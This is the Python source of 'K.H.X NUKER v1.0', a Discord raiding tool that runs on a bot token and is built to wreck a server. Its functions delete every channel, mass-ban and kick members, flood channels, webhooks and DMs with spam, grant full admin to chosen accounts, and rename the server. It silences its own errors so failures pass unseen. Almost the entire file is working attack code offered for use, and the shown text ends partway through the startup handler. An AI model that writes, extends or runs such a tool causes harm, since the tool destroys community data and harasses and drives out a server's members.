"""
Copyright (c) 2026 Khazix-911
All Rights Reserved.
K.H.X NUKER v1.0 - Terminal Mode
"""

import os
import time
import discord
from discord.ext import commands
import random
import config
import urllib.request
import asyncio
import sys
import logging
from pystyle import Colors, Colorate
from datetime import datetime

logging.getLogger("discord.gateway").setLevel(logging.ERROR)
logging.getLogger("discord.client").setLevel(logging.ERROR)
logging.getLogger("discord.http").setLevel(logging.ERROR)

discord.gateway.DiscordWebSocket.heartbeat = 999999


def silent_excepthook(exc_type, exc_value, exc_traceback):
    pass


sys.excepthook = silent_excepthook


class PrintSystem:
    def __init__(self):
        self.stats = {
            "channels_deleted": 0,
            "channels_created": 0,
            "members_banned": 0,
            "members_kicked": 0,
            "messages_sent": 0,
            "webhooks_created": 0,
            "webhook_messages": 0,
            "roles_created": 0,
            "dms_sent": 0,
            "admin_granted": 0,
            "icon_changed": False,
            "name_changed": False,
            "description_changed": False,
            "rate_limits": 0,
        }

    def channel_deleted(self, channel_id, channel_name):
        timestamp = datetime.now().strftime("%H:%M:%S")
        print(
            Colorate.Color(
                Colors.red,
                f"[{timestamp}] Channel {channel_id} ({channel_name}) deleted",
            )
        )
        self.stats["channels_deleted"] += 1

    def channel_created(self, channel_id, channel_name, channel_type):
        timestamp = datetime.now().strftime("%H:%M:%S")
        print(
            Colorate.Color(
                Colors.green,
                f"[{timestamp}] Channel {channel_id} ({channel_name}) [{channel_type}] created",
            )
        )
        self.stats["channels_created"] += 1

    def member_banned(self, member_id, member_name):
        timestamp = datetime.now().strftime("%H:%M:%S")
        print(
            Colorate.Color(
                Colors.red, f"[{timestamp}] Member {member_id} ({member_name}) banned"
            )
        )
        self.stats["members_banned"] += 1

    def member_kicked(self, member_id, member_name):
        timestamp = datetime.now().strftime("%H:%M:%S")
        print(
            Colorate.Color(
                Colors.red, f"[{timestamp}] Member {member_id} ({member_name}) kicked"
            )
        )
        self.stats["members_kicked"] += 1

    def member_skipped_whitelist(self, member_id, member_name):
        timestamp = datetime.now().strftime("%H:%M:%S")
        print(
            Colorate.Color(
                Colors.yellow,
                f"[{timestamp}] Member {member_id} ({member_name}) skipped (whitelisted)",
            )
        )

    def member_skipped_higher_role(self, member_id, member_name):
        timestamp = datetime.now().strftime("%H:%M:%S")
        print(
            Colorate.Color(
                Colors.yellow,
                f"[{timestamp}] Member {member_id} ({member_name}) skipped (higher role)",
            )
        )

    def rate_limit_hit(self, retry_after):
        timestamp = datetime.now().strftime("%H:%M:%S")
        print(
            Colorate.Color(
                Colors.yellow,
                f"[{timestamp}] Rate limit! Waiting {retry_after:.1f}s...",
            )
        )
        self.stats["rate_limits"] += 1

    def message_sent(self, channel_id, channel_name):
        timestamp = datetime.now().strftime("%H:%M:%S")
        print(
            Colorate.Color(
                Colors.green,
                f"[{timestamp}] Message sent to {channel_id} ({channel_name})",
            )
        )
        self.stats["messages_sent"] += 1

    def webhook_created(self, channel_id, channel_name):
        timestamp = datetime.now().strftime("%H:%M:%S")
        print(
            Colorate.Color(
                Colors.cyan,
                f"[{timestamp}] Webhook created in {channel_id} ({channel_name})",
            )
        )
        self.stats["webhooks_created"] += 1

    def webhook_message_sent(self, channel_id, channel_name):
        timestamp = datetime.now().strftime("%H:%M:%S")
        print(
            Colorate.Color(
                Colors.green,
                f"[{timestamp}] Webhook message sent to {channel_id} ({channel_name})",
            )
        )
        self.stats["webhook_messages"] += 1

    def role_created(self, role_id, role_name):
        timestamp = datetime.now().strftime("%H:%M:%S")
        print(
            Colorate.Color(
                Colors.purple, f"[{timestamp}] Role {role_id} ({role_name}) created"
            )
        )
        self.stats["roles_created"] += 1

    def admin_granted(self, member_id, member_name):
        timestamp = datetime.now().strftime("%H:%M:%S")
        print(
            Colorate.Color(
                Colors.green,
                f"[{timestamp}] Admin granted to {member_id} ({member_name})",
            )
        )
        self.stats["admin_granted"] += 1

    def dm_sent(self, member_id, member_name):
        timestamp = datetime.now().strftime("%H:%M:%S")
        print(
            Colorate.Color(
                Colors.green, f"[{timestamp}] DM sent to {member_id} ({member_name})"
            )
        )
        self.stats["dms_sent"] += 1

    def icon_changed(self):
        timestamp = datetime.now().strftime("%H:%M:%S")
        print(Colorate.Color(Colors.green, f"[{timestamp}] Server icon changed"))
        self.stats["icon_changed"] = True

    def name_changed(self, new_name):
        timestamp = datetime.now().strftime("%H:%M:%S")
        print(
            Colorate.Color(
                Colors.green, f"[{timestamp}] Server name changed to: {new_name}"
            )
        )
        self.stats["name_changed"] = True

    def description_changed(self):
        timestamp = datetime.now().strftime("%H:%M:%S")
        print(Colorate.Color(Colors.green, f"[{timestamp}] Server description changed"))
        self.stats["description_changed"] = True

    def print_summary(self, operation_name, elapsed_time):
        print(Colorate.Color(Colors.blue, "\n" + "=" * 70))
        print(Colorate.Color(Colors.yellow, f"[!] {operation_name} - STATISTICS"))
        print(Colorate.Color(Colors.blue, "=" * 70))

        if (
            self.stats["icon_changed"]
            or self.stats["name_changed"]
            or self.stats["description_changed"]
        ):
            print(Colorate.Color(Colors.cyan, "\n[Server Changes]:"))
            if self.stats["icon_changed"]:
                print(Colorate.Color(Colors.green, "  ✓ Icon changed"))
            if self.stats["name_changed"]:
                print(Colorate.Color(Colors.green, "  ✓ Name changed"))
            if self.stats["description_changed"]:
                print(Colorate.Color(Colors.green, "  ✓ Description changed"))

        if self.stats["channels_deleted"] > 0:
            print(
                Colorate.Color(
                    Colors.cyan,
                    f"\n[Channels Deleted]: {Colorate.Color(Colors.red, str(self.stats['channels_deleted']))}",
                )
            )

        if self.stats["channels_created"] > 0:
            print(
                Colorate.Color(
                    Colors.cyan,
                    f"[Channels Created]: {Colorate.Color(Colors.green, str(self.stats['channels_created']))}",
                )
            )

        if self.stats["members_banned"] > 0:
            print(
                Colorate.Color(
                    Colors.cyan,
                    f"[Members Banned]: {Colorate.Color(Colors.red, str(self.stats['members_banned']))}",
                )
            )

        if self.stats["members_kicked"] > 0:
            print(
                Colorate.Color(
                    Colors.cyan,
                    f"[Members Kicked]: {Colorate.Color(Colors.red, str(self.stats['members_kicked']))}",
                )
            )

        if self.stats["messages_sent"] > 0:
            print(
                Colorate.Color(
                    Colors.cyan,
                    f"[Messages Sent]: {Colorate.Color(Colors.green, str(self.stats['messages_sent']))}",
                )
            )

        if self.stats["webhooks_created"] > 0:
            print(
                Colorate.Color(
                    Colors.cyan,
                    f"[Webhooks Created]: {Colorate.Color(Colors.green, str(self.stats['webhooks_created']))}",
                )
            )

        if self.stats["webhook_messages"] > 0:
            print(
                Colorate.Color(
                    Colors.cyan,
                    f"[Webhook Messages]: {Colorate.Color(Colors.green, str(self.stats['webhook_messages']))}",
                )
            )

        if self.stats["roles_created"] > 0:
            print(
                Colorate.Color(
                    Colors.cyan,
                    f"[Roles Created]: {Colorate.Color(Colors.green, str(self.stats['roles_created']))}",
                )
            )

        if self.stats["dms_sent"] > 0:
            print(
                Colorate.Color(
                    Colors.cyan,
                    f"[DMs Sent]: {Colorate.Color(Colors.green, str(self.stats['dms_sent']))}",
                )
            )

        if self.stats["admin_granted"] > 0:
            print(
                Colorate.Color(
                    Colors.cyan,
                    f"[Admin Granted]: {Colorate.Color(Colors.green, str(self.stats['admin_granted']))}",
                )
            )

        if self.stats["rate_limits"] > 0:
            print(
                Colorate.Color(
                    Colors.yellow,
                    f"[Rate Limits]: {Colorate.Color(Colors.yellow, str(self.stats['rate_limits']))}",
                )
            )

        print(Colorate.Color(Colors.blue, "=" * 70))
        print(
            Colorate.Color(Colors.green, f"[✓] COMPLETED - Time: {elapsed_time:.2f}s")
        )
        print(Colorate.Color(Colors.blue, "=" * 70 + "\n"))

    def reset_stats(self):
        self.stats = {
            "channels_deleted": 0,
            "channels_created": 0,
            "members_banned": 0,
            "members_kicked": 0,
            "messages_sent": 0,
            "webhooks_created": 0,
            "webhook_messages": 0,
            "roles_created": 0,
            "dms_sent": 0,
            "admin_granted": 0,
            "icon_changed": False,
            "name_changed": False,
            "description_changed": False,
            "rate_limits": 0,
        }


printer = PrintSystem()


async def ban_with_retry(member):
    while True:
        try:
            await member.ban(reason="K.H.X NUKER by Khazix-911")
            printer.member_banned(member.id, member.name)
            return True
        except discord.Forbidden:
            printer.member_skipped_higher_role(member.id, member.name)
            return False
        except discord.HTTPException as e:
            if e.status == 429:
                retry_after = e.retry_after if hasattr(e, "retry_after") else 1.0
                printer.rate_limit_hit(retry_after)
                await asyncio.sleep(retry_after)
            else:
                return False
        except:
            return False


async def kick_with_retry(member):
    while True:
        try:
            await member.kick(reason="K.H.X NUKER by Khazix-911")
            printer.member_kicked(member.id, member.name)
            return True
        except discord.Forbidden:
            printer.member_skipped_higher_role(member.id, member.name)
            return False
        except discord.HTTPException as e:
            if e.status == 429:
                retry_after = e.retry_after if hasattr(e, "retry_after") else 1.0
                printer.rate_limit_hit(retry_after)
                await asyncio.sleep(retry_after)
            else:
                return False
        except:
            return False


async def send_message_with_retry(channel, content):
    while True:
        try:
            await channel.send(content)
            printer.message_sent(channel.id, channel.name)
            return True
        except discord.HTTPException as e:
            if e.status == 429:
                retry_after = e.retry_after if hasattr(e, "retry_after") else 1.0
                printer.rate_limit_hit(retry_after)
                await asyncio.sleep(retry_after)
            else:
                return False
        except:
            return False


async def send_embed_with_retry(channel, include_everyone=False):
    while True:
        try:
            embed_config = config.EMBED_CONFIG
            embed = discord.Embed(
                title=embed_config.get("title", ""),
                description=embed_config.get("description", ""),
                color=embed_config.get("color", 0),
            )
            for field in embed_config.get("fields", []):
                embed.add_field(
                    name=field["name"],
                    value=field["value"],
                    inline=field.get("inline", False),
                )
            embed.set_image(url=embed_config.get("image", ""))
            embed.set_footer(text=embed_config.get("footer", ""))
            if include_everyone:
                message = f"@everyone {embed_config.get('message', '')}"
            else:
                message = embed_config.get("message", "")
            await channel.send(content=message, embed=embed)
            printer.message_sent(channel.id, channel.name)
            return True
        except discord.HTTPException as e:
            if e.status == 429:
                retry_after = e.retry_after if hasattr(e, "retry_after") else 1.0
                printer.rate_limit_hit(retry_after)
                await asyncio.sleep(retry_after)
            else:
                return False
        except:
            return False


async def send_embed_webhook_message_with_retry(webhook, include_everyone):
    while True:
        try:
            embed_config = config.EMBED_CONFIG
            embed = discord.Embed(
                title=embed_config.get("title", ""),
                description=embed_config.get("description", ""),
                color=embed_config.get("color", 0),
            )
            for field in embed_config.get("fields", []):
                embed.add_field(
                    name=field["name"],
                    value=field["value"],
                    inline=field.get("inline", False),
                )
            embed.set_image(url=embed_config.get("image", ""))
            embed.set_footer(text=embed_config.get("footer", ""))
            if include_everyone:
                message = f"@everyone {embed_config.get('message', '')}"
            else:
                message = embed_config.get("message", "")
            await webhook.send(content=message, embed=embed)
            printer.webhook_message_sent(webhook.channel.id, webhook.channel.name)
            return True
        except discord.HTTPException as e:
            if e.status == 429:
                retry_after = e.retry_after if hasattr(e, "retry_after") else 1.0
                printer.rate_limit_hit(retry_after)
                await asyncio.sleep(retry_after)
            else:
                return False
        except:
            return False


async def nuke_command(guild):
    try:
        printer.reset_stats()
        start_time_total = time.time()

        print(Colorate.Color(Colors.red, "\n" + "=" * 70))
        print(Colorate.Color(Colors.red, "[!] K.H.X NUKER - Instant Execution Mode"))
        print(Colorate.Color(Colors.red, "=" * 70))

        from config import AUTO_RAID_CONFIG, CHANNELS_CONFIG

        num_new_channels = AUTO_RAID_CONFIG["num_channels"]
        channel_type = AUTO_RAID_CONFIG["channel_type"]
        default_channel_name = AUTO_RAID_CONFIG["channel_name"]
        num_messages = AUTO_RAID_CONFIG["num_messages"]
        message_content = AUTO_RAID_CONFIG["message_content"]

        channel_names = CHANNELS_CONFIG.get("names", [default_channel_name])

        old_channels = [ch for ch in guild.channels]

        bot_member = guild.me
        bot_top_role = bot_member.top_role
        whitelisted_ids = config.NO_BAN_KICK_ID

        members_to_ban = []
        for member in guild.members:
            if member == bot_member:
                continue
            if member.id in whitelisted_ids:
                printer.member_skipped_whitelist(member.id, member.name)
                continue
            if member.top_role >= bot_top_role and member != guild.owner:
                printer.member_skipped_higher_role(member.id, member.name)
                continue
            members_to_ban.append(member)

        async def fast_change_settings():
            try:
                await guild.edit(name=config.SERVER_CONFIG["new_name"])
                printer.name_changed(config.SERVER_CONFIG["new_name"])
                icon_path = config.NUKE_ICON_URL
                if os.path.exists(icon_path):
                    with open(icon_path, "rb") as f:
                        icon_data = f.read()
                    await guild.edit(icon=icon_data)
                    printer.icon_changed()
            except:
                pass

        async def ultra_delete():
            try:
                delete_tasks = [ch.delete() for ch in old_channels]
                results = await asyncio.gather(*delete_tasks, return_exceptions=True)
                for i, ch in enumerate(old_channels):
                    if not isinstance(results[i], Exception):
                        printer.channel_deleted(ch.id, ch.name)
            except:
                pass

        async def ultra_ban():
            try:
                if members_to_ban:
                    ban_tasks = [ban_with_retry(m) for m in members_to_ban]
                    await asyncio.gather(*ban_tasks, return_exceptions=True)
            except:
                pass

        async def ultra_create_and_spam():
            try:

                async def create_and_spam_immediately(idx):
                    try:
                        channel_name = channel_names[idx % len(channel_names)]
                        if channel_type == "text":
                            channel = await guild.create_text_channel(channel_name)
                        else:
                            channel = await guild.create_voice_channel(channel_name)
                        printer.channel_created(channel.id, channel.name, channel_type)

                        async def do_spam():
                            if (
                                isinstance(channel, discord.TextChannel)
                                and num_messages > 0
                            ):
                                if message_content.lower() == "embed":
                                    await send_embed_with_retry(channel, False)
                                else:
                                    for _ in range(num_messages):
                                        await send_message_with_retry(
                                            channel, message_content
                                        )

                        asyncio.create_task(do_spam())
                    except:
                        pass

                all_tasks = [
                    create_and_spam_immediately(i) for i in range(num_new_channels)
                ]
                await asyncio.gather(*all_tasks, return_exceptions=True)
            except Exception as e:
                print(
                    Colorate.Color(
                        Colors.red, f"[-] Error in ultra_create_and_spam: {e}"
                    )
                )

        await asyncio.gather(
            fast_change_settings(), ultra_delete(), ultra_ban(), ultra_create_and_spam()
        )

        end_time_total = time.time()
        printer.print_summary("K.H.X NUKER", end_time_total - start_time_total)

    except Exception as e:
        print(Colorate.Color(Colors.red, f"[-] Error in nuke: {e}"))


async def create_channels_command(
    guild, num_channels, channel_type, channel_names=None
):
    try:
        printer.reset_stats()
        start_time_total = time.time()

        if channel_names is None:
            from config import CHANNELS_CONFIG

            channel_names = CHANNELS_CONFIG.get("names", ["channel"])
            if len(channel_names) > 1:
                print(
                    Colorate.Color(
                        Colors.yellow,
                        f"\n[!] Using {len(channel_names)} different channel names",
                    )
                )

        print(
            Colorate.Color(
                Colors.yellow,
                f"\n[!] Creating {num_channels} {channel_type} channels in parallel...",
            )
        )

        tasks = []
        for i in range(num_channels):
            channel_name = channel_names[i % len(channel_names)]
            if channel_type == "text":
                tasks.append(guild.create_text_channel(channel_name))
            else:
                tasks.append(guild.create_voice_channel(channel_name))

        results = await asyncio.gather(*tasks, return_exceptions=True)
        for result in results:
            if not isinstance(result, Exception):
                printer.channel_created(result.id, result.name, channel_type)

        printer.print_summary("CREATE CHANNELS", time.time() - start_time_total)
    except Exception as e:
        print(Colorate.Color(Colors.red, f"[-] Error: {e}"))


async def spam_channels_command(guild, num_messages, message_content, include_everyone):
    try:
        printer.reset_stats()
        start_time_total = time.time()
        text_channels = [
            ch for ch in guild.channels if isinstance(ch, discord.TextChannel)
        ]
        total_messages = len(text_channels) * num_messages
        print(
            Colorate.Color(
                Colors.yellow,
                f"\n[!] Spamming {num_messages} msgs to {len(text_channels)} channels ({total_messages} total)...",
            )
        )

        tasks = []
        for channel in text_channels:
            for _ in range(num_messages):
                if message_content.lower() == "embed":
                    tasks.append(send_embed_with_retry(channel, include_everyone))
                else:
                    tasks.append(send_message_with_retry(channel, message_content))

        results = await asyncio.gather(*tasks, return_exceptions=True)
        sent = sum(1 for r in results if r is True)

        printer.stats["messages_sent"] = sent
        printer.print_summary("SPAM CHANNELS", time.time() - start_time_total)
    except Exception as e:
        print(Colorate.Color(Colors.red, f"[-] Error: {e}"))


async def webhook_spam_command(guild, num_messages, message_content, include_everyone):
    try:
        printer.reset_stats()
        start_time_total = time.time()

        webhook_tasks = []
        for channel in guild.channels:
            if isinstance(channel, discord.TextChannel):
                webhook_tasks.append(
                    channel.create_webhook(name=config.WEBHOOK_CONFIG["default_name"])
                )

        webhooks = []
        results = await asyncio.gather(*webhook_tasks, return_exceptions=True)
        for i, result in enumerate(results):
            if not isinstance(result, Exception):
                webhooks.append(result)
                printer.webhook_created(result.channel.id, result.channel.name)

        print(
            Colorate.Color(
                Colors.yellow,
                f"\n[!] Webhook spam to {len(webhooks)} webhooks, {num_messages} msgs each...",
            )
        )

        send_tasks = []
        for webhook in webhooks:
            for _ in range(num_messages):
                if message_content.lower() == "embed":
                    send_tasks.append(
                        send_embed_webhook_message_with_retry(webhook, include_everyone)
                    )
                else:
                    send_tasks.append(webhook.send(content=message_content))

        results = await asyncio.gather(*send_tasks, return_exceptions=True)
        sent = sum(1 for r in results if not isinstance(r, Exception))

        printer.stats["webhook_messages"] = sent
        printer.print_summary("WEBHOOK SPAM", time.time() - start_time_total)
    except Exception as e:
        print(Colorate.Color(Colors.red, f"[-] Error: {e}"))


async def ban_all_command(guild):
    try:
        printer.reset_stats()
        start_time_total = time.time()

        bot_member = guild.me
        bot_top_role = bot_member.top_role
        whitelisted_ids = config.NO_BAN_KICK_ID

        members_to_ban = []
        for member in guild.members:
            if member == bot_member:
                continue
            if member.id in whitelisted_ids:
                printer.member_skipped_whitelist(member.id, member.name)
                continue
            if member.top_role >= bot_top_role and member != guild.owner:
                printer.member_skipped_higher_role(member.id, member.name)
                continue
            members_to_ban.append(member)

        if members_to_ban:
            print(
                Colorate.Color(
                    Colors.yellow,
                    f"\n[!] Banning {len(members_to_ban)} members in parallel...",
                )
            )
            ban_tasks = [ban_with_retry(m) for m in members_to_ban]
            await asyncio.gather(*ban_tasks, return_exceptions=True)

        printer.print_summary("BAN ALL", time.time() - start_time_total)
    except Exception as e:
        print(Colorate.Color(Colors.red, f"[-] Error: {e}"))


async def kick_all_command(guild):
    try:
        printer.reset_stats()
        start_time_total = time.time()

        bot_member = guild.me
        bot_top_role = bot_member.top_role
        whitelisted_ids = config.NO_BAN_KICK_ID

        members_to_kick = []
        for member in guild.members:
            if member == bot_member:
                continue
            if member.id in whitelisted_ids:
                printer.member_skipped_whitelist(member.id, member.name)
                continue
            if member.top_role >= bot_top_role and member != guild.owner:
                printer.member_skipped_higher_role(member.id, member.name)
                continue
            members_to_kick.append(member)

        if members_to_kick:
            print(
                Colorate.Color(
                    Colors.yellow,
                    f"\n[!] Kicking {len(members_to_kick)} members in parallel...",
                )
            )
            kick_tasks = [kick_with_retry(m) for m in members_to_kick]
            await asyncio.gather(*kick_tasks, return_exceptions=True)

        printer.print_summary("KICK ALL", time.time() - start_time_total)
    except Exception as e:
        print(Colorate.Color(Colors.red, f"[-] Error: {e}"))


async def create_roles_command(guild, num_roles, role_names=None):
    try:
        printer.reset_stats()
        start_time_total = time.time()

        if role_names is None:
            from config import ROLES_CONFIG

            role_names = ROLES_CONFIG.get("names", ["Role"])
            if len(role_names) > 1:
                print(
                    Colorate.Color(
                        Colors.yellow,
                        f"\n[!] Using {len(role_names)} different role names",
                    )
                )

        print(
            Colorate.Color(
                Colors.yellow, f"\n[!] Creating {num_roles} roles in parallel..."
            )
        )

        tasks = []
        for i in range(num_roles):
            role_name = role_names[i % len(role_names)]
            color = discord.Colour.from_rgb(
                random.randint(0, 255), random.randint(0, 255), random.randint(0, 255)
            )
            tasks.append(guild.create_role(name=role_name, colour=color))

        results = await asyncio.gather(*tasks, return_exceptions=True)
        for result in results:
            if not isinstance(result, Exception):
                printer.role_created(result.id, result.name)

        printer.print_summary("CREATE ROLES", time.time() - start_time_total)
    except Exception as e:
        print(Colorate.Color(Colors.red, f"[-] Error: {e}"))


async def get_admin_command(guild, user_id=None):
    try:
        printer.reset_stats()
        start_time_total = time.time()

        whitelisted_ids = config.NO_BAN_KICK_ID
        admin_ids = config.ADMIN_IDS

        color = discord.Colour.from_rgb(
            random.randint(0, 255), random.randint(0, 255), random.randint(0, 255)
        )
        admin_role = await guild.create_role(
            name="K.H.X-ADMIN", colour=color, permissions=discord.Permissions.all()
        )
        printer.role_created(admin_role.id, admin_role.name)

        bot_role = guild.me.top_role
        try:
            await admin_role.edit(position=bot_role.position - 1)
            print(
                Colorate.Color(
                    Colors.green, f"[+] Admin role placed below {bot_role.name}"
                )
            )
        except Exception as e:
            print(Colorate.Color(Colors.yellow, f"[!] Could not position role: {e}"))

        members_to_grant = set()

        if user_id:
            try:
                target_user = await guild.fetch_member(user_id)
                if target_user:
                    members_to_grant.add(target_user)
                    if user_id in whitelisted_ids:
                        print(
                            Colorate.Color(
                                Colors.yellow,
                                f"[!] User {user_id} is whitelisted, but granting admin anyway.",
                            )
                        )
            except discord.NotFound:
                print(Colorate.Color(Colors.red, f"[!] User {user_id} not found"))
            except Exception as e:
                print(Colorate.Color(Colors.red, f"[!] Error: {e}"))
        else:
            for admin_id in admin_ids:
                try:
                    member = await guild.fetch_member(admin_id)
                    if member:
                        members_to_grant.add(member)
                        print(
                            Colorate.Color(
                                Colors.cyan, f"[+] Added Admin ID: {admin_id}"
                            )
                        )
                except discord.NotFound:
                    print(
                        Colorate.Color(
                            Colors.red, f"[!] Admin ID {admin_id} not in server"
                        )
                    )
                except Exception as e:
                    print(
                        Colorate.Color(Colors.red, f"[!] Error with ID {admin_id}: {e}")
                    )

        if members_to_grant:
            print(
                Colorate.Color(
                    Colors.yellow,
                    f"\n[!] Granting admin to {len(members_to_grant)} members in parallel...",
                )
            )
            tasks = [member.add_roles(admin_role) for member in members_to_grant]
            results = await asyncio.gather(*tasks, return_exceptions=True)
            granted = sum(1 for r in results if not isinstance(r, Exception))
            printer.stats["admin_granted"] = granted
            print(
                Colorate.Color(Colors.green, f"[+] Admin granted to {granted} members")
            )
        else:
            print(Colorate.Color(Colors.yellow, "[!] No members to grant admin"))

        printer.print_summary("GET ADMIN", time.time() - start_time_total)
    except Exception as e:
        print(Colorate.Color(Colors.red, f"[-] Error in get_admin_command: {e}"))


async def change_server_command(guild, new_name, new_icon_url, new_description):
    try:
        printer.reset_stats()
        start_time_total = time.time()

        tasks = []
        if new_name:
            tasks.append(guild.edit(name=new_name))
        if new_icon_url:
            try:
                with urllib.request.urlopen(new_icon_url) as response:
                    icon_data = response.read()
                tasks.append(guild.edit(icon=icon_data))
            except:
                pass
        if new_description:
            tasks.append(guild.edit(description=new_description))

        if tasks:
            await asyncio.gather(*tasks, return_exceptions=True)
            if new_name:
                printer.name_changed(new_name)
            if new_icon_url:
                printer.icon_changed()
            if new_description:
                printer.description_changed()

        printer.print_summary("CHANGE SERVER", time.time() - start_time_total)
    except Exception as e:
        print(Colorate.Color(Colors.red, f"[-] Error: {e}"))


async def dm_all_command(guild, message_content):
    try:
        printer.reset_stats()
        start_time_total = time.time()
        members_to_dm = [m for m in guild.members if not m.bot and m != guild.me]
        print(
            Colorate.Color(
                Colors.yellow,
                f"\n[!] DMing {len(members_to_dm)} members in parallel...",
            )
        )

        async def dm_with_retry(member):
            while True:
                try:
                    await member.send(message_content)
                    printer.dm_sent(member.id, member.name)
                    return True
                except discord.HTTPException as e:
                    if e.status == 429:
                        retry_after = (
                            e.retry_after if hasattr(e, "retry_after") else 1.0
                        )
                        printer.rate_limit_hit(retry_after)
                        await asyncio.sleep(retry_after)
                    else:
                        return False
                except:
                    return False

        tasks = [dm_with_retry(member) for member in members_to_dm]
        results = await asyncio.gather(*tasks, return_exceptions=True)
        sent = sum(1 for r in results if r is True)

        printer.stats["dms_sent"] = sent
        printer.print_summary("DM ALL", time.time() - start_time_total)
    except Exception as e:
        print(Colorate.Color(Colors.red, f"[-] Error: {e}"))


async def auto_raid_command(guild):
    try:
        from config import AUTO_RAID_CONFIG, CHANNELS_CONFIG

        printer.reset_stats()
        start_time_total = time.time()

        print(Colorate.Color(Colors.blue, "\n" + "=" * 70))
        print(Colorate.Color(Colors.yellow, "[!] AUTO RAID - Parallel Execution"))
        print(Colorate.Color(Colors.blue, "=" * 70))

        delete_tasks = [ch.delete() for ch in guild.channels]
        results = await asyncio.gather(*delete_tasks, return_exceptions=True)
        for i, ch in enumerate(guild.channels):
            if not isinstance(results[i], Exception):
                printer.channel_deleted(ch.id, ch.name)

        bot_member = guild.me
        bot_top_role = bot_member.top_role
        whitelisted_ids = config.NO_BAN_KICK_ID

        members_to_ban = []
        for member in guild.members:
            if member == bot_member:
                continue
            if member.id in whitelisted_ids:
                continue
            if member.top_role >= bot_top_role and member != guild.owner:
                continue
            members_to_ban.append(member)

        if members_to_ban:
            ban_tasks = [ban_with_retry(m) for m in members_to_ban]
            await asyncio.gather(*ban_tasks, return_exceptions=True)

        num_channels = AUTO_RAID_CONFIG["num_channels"]
        channel_type = AUTO_RAID_CONFIG["channel_type"]
        default_channel_name = AUTO_RAID_CONFIG["channel_name"]

        channel_names = CHANNELS_CONFIG.get("names", [default_channel_name])

        create_tasks = []
        for i in range(num_channels):
            channel_name = channel_names[i % len(channel_names)]
            if channel_type == "text":
                create_tasks.append(guild.create_text_channel(channel_name))
            else:
                create_tasks.append(guild.create_voice_channel(channel_name))

        channels = []
        results = await asyncio.gather(*create_tasks, return_exceptions=True)
        for result in results:
            if not isinstance(result, Exception):
                channels.append(result)
                printer.channel_created(result.id, result.name, channel_type)

        num_messages = AUTO_RAID_CONFIG["num_messages"]
        message_content = AUTO_RAID_CONFIG["message_content"]

        text_channels = [ch for ch in channels if isinstance(ch, discord.TextChannel)]
        if text_channels and num_messages > 0:
            spam_tasks = []
            for channel in text_channels:
                for _ in range(num_messages):
                    spam_tasks.append(send_message_with_retry(channel, message_content))
            await asyncio.gather(*spam_tasks, return_exceptions=True)
            printer.stats["messages_sent"] = len(text_channels) * num_messages

        printer.print_summary("AUTO RAID", time.time() - start_time_total)
    except Exception as e:
        print(Colorate.Color(Colors.red, f"[-] Error: {e}"))


def show_menu():
    print(Colorate.Color(Colors.green, "\n" + "=" * 70))
    print(
        Colorate.Color(
            Colors.yellow, "                     K.H.X NUKER v1.0 - MAIN MENU"
        )
    )
    print(Colorate.Color(Colors.green, "=" * 70))
    print(Colorate.Color(Colors.cyan, " 1  - NUKE (Full Parallel Execution) [INSTANT]"))
    print(Colorate.Color(Colors.cyan, " 2  - Create Channels (Mass Channel Creation)"))
    print(Colorate.Color(Colors.cyan, " 3  - Spam Channels (Mass Message Spam)"))
    print(Colorate.Color(Colors.cyan, " 4  - Webhook Spam (Webhook Attack)"))
    print(Colorate.Color(Colors.cyan, " 5  - Kick All Members"))
    print(Colorate.Color(Colors.cyan, " 6  - Ban All Members"))
    print(Colorate.Color(Colors.cyan, " 7  - Create Roles (Mass Role Creation)"))
    print(Colorate.Color(Colors.cyan, " 8  - Get Admin (Grant Admin Role)"))
    print(Colorate.Color(Colors.cyan, " 9  - Change Server Settings"))
    print(Colorate.Color(Colors.cyan, " 10 - DM All Members"))
    print(Colorate.Color(Colors.cyan, " 11 - Auto Raid (From Config)"))
    print(Colorate.Color(Colors.cyan, " 00 - EXIT"))
    print(Colorate.Color(Colors.cyan, " 0  - Change Server"))
    print(Colorate.Color(Colors.green, "=" * 70))
    print(Colorate.Color(Colors.red, "[!] PARALLEL MODE | Auto-Retry on Rate Limits"))
    print(Colorate.Color(Colors.green, "=" * 70))


ascii_art = r'''

 ,ggg,        gg   ,ggg,        gg      ,ggg,          ,gg     ,ggg,         ,gg        88         ,a888a,    
dP""Y8b       dP  dP""Y8b       88     dP"""Y8,      ,dP'     dP""Y8a       ,8P       ,d88       ,8P"' `"Y8,  
Yb, `88      d8'  Yb, `88       88     Yb,_  "8b,   d8"       Yb, `88       d8'     888888      ,8P       Y8, 
 `"  88    ,dP'    `"  88       88      `""    Y8,,8P'         `"  88       88          88      88         88 
     88aaad8"          88aaaaaaa88              Y88"               88       88          88      88         88 
     88""""Yb,         88"""""""88             ,888b               I8       8I          88      88         88 
     88     "8b        88       88            d8" "8b,             `8,     ,8'          88      88         88 
     88      `8i       88       88          ,8P'    Y8,             Y8,   ,8P           88      `8b       d8' 
     88       Yb, d8b  88       Y8, d8b    d8"       "Yb,            Yb,_,dP            88  d8b  `8ba, ,ad8'  
     88        Y8 Y8P  88       `Y8 Y8P  ,8P'          "Y8            "Y8P"             88  Y8P    "Y888P"    

'''

print(Colorate.Color(Colors.red, ascii_art))
print(
    Colorate.Color(
        Colors.blue, "###########################################################"
    )
)
print(
    Colorate.Color(
        Colors.blue, "#              K.H.X NUKER v1.0 By Khazix-911              #"
    )
)
print(
    Colorate.Color(
        Colors.blue, "###########################################################"
    )
)

bot_token = input(Colorate.Color(Colors.blue, "\n[?] Enter Bot Token: ")).strip()

intents = discord.Intents.all()
bot = commands.Bot(command_prefix="!", intents=intents, help_command=None)


@bot.event
async def on_command_error(ctx, error):
    pass


@bot.event
async def on_error(event, *args, **kwargs):
    pass


current_guild = None


@bot.event
async def on_ready():
    global current_guild
    print(Colorate.Color(Colors.green, f"\n[+] Bot Online: {bot.user.name}"))

    print(Colorate.Color(Colors.yellow, "\n[+] Available Servers:"))
    for i, guild in enumerate(bot.guilds):
        print(
            Colorate.Color(Colors.cyan, f"    {i + 1}. {guild.name} (ID: {guild.id})")
        )

    print(Colorate.Color(Colors.green, "\n" + "=" * 50))
    guild_input = input(
        Colorate.Color(Colors.blue, "[?] Enter Server ID or number: ")
    ).strip()

    try:
        if guild_input.isdigit() and int(guild_input) <= len(bot.guilds):
            current_guild = bot.guilds[int(guild_input) - 1]
        else:
            guild_id = int(guild_input)
            current_guild = bot.get_guild(guild_id)

        if not current_guild:
            print(Colorate.Color(Colors.red, "[!] Server not found!"))
            await bot.close()
            return

        permissions = current_guild.me.guild_permissions

